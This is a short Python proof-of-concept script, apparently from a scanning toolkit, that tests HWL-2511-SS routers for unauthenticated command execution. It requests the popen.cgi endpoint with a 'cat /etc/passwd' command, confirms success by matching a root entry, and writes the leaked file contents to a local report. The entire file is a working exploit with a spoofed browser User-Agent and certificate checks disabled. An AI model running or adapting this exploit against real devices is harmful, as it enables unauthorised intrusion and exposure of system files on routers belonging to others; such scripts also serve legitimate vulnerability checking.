import re
import requests
import time
import buter
import wirtefile

info = "HWL-2511-SS路由器命令执行"
filename = f"./reps/{info}-"+str(time.strftime("%Y-%m-%d", time.localtime()))
poc = '/cgi-bin/popen.cgi?command=cat%20/etc/passwd'
headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15"
}
def HWL2511SSRCE(url):
    try:
        reps = requests.get(url=url + poc, headers=headers, verify=False, timeout=5)
        pattern = re.compile(r'root:.*:0:0')
        match = pattern.search(reps.text)
        if reps.status_code == 200 and match:
            print(buter.colors.GREEN+  f"存在{info} url : {url}" + buter.colors.END)
            reptext = reps.url + "\n" + reps.text
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现{info} url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
